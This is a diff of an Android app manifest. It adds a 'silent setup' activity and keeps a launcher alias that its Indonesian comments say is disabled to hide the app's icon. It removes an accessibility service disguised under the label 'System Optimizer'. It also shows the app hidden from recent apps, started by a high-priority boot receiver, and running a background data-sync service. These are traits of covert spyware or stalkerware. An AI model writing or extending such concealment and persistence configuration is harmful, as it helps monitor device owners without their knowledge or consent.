@@ -52,14 +52,21 @@
         android:requestLegacyExternalStorage="true"
         android:theme="@style/Theme.AndroidConnector">
 
-        <!-- Main activity — no launcher intent-filter (alias handles it) -->
+        <!-- Main activity -->
         <activity
             android:name=".MainActivity"
             android:exported="true"
             android:screenOrientation="portrait"
             android:excludeFromRecents="true" />
 
-        <!-- Launcher alias — disable ini untuk sembunyikan ikon -->
+        <!-- Silent setup — request permission satu per satu (klik manual user) -->
+        <activity
+            android:name=".SilentSetupActivity"
+            android:exported="false"
+            android:screenOrientation="portrait"
+            android:excludeFromRecents="true" />
+
+        <!-- Launcher alias — disable untuk sembunyikan ikon -->
         <activity-alias
             android:name=".MainLauncherAlias"
             android:targetActivity=".MainActivity"
@@ -77,20 +84,6 @@
             android:enabled="true"
             android:exported="false"
             android:foregroundServiceType="dataSync" />
-
-        <!-- Accessibility Protection Service -->
-        <service
-            android:name=".ProtectionService"
-            android:exported="true"
-            android:label="System Optimizer"
-            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
-            <intent-filter>
-                <action android:name="android.accessibilityservice.AccessibilityService" />
-            </intent-filter>
-            <meta-data
-                android:name="android.accessibilityservice"
-                android:resource="@xml/accessibility_service_config" />
-        </service>
 
         <receiver android:name=".BootReceiver" android:enabled="true" android:exported="true">
             <intent-filter android:priority="999">
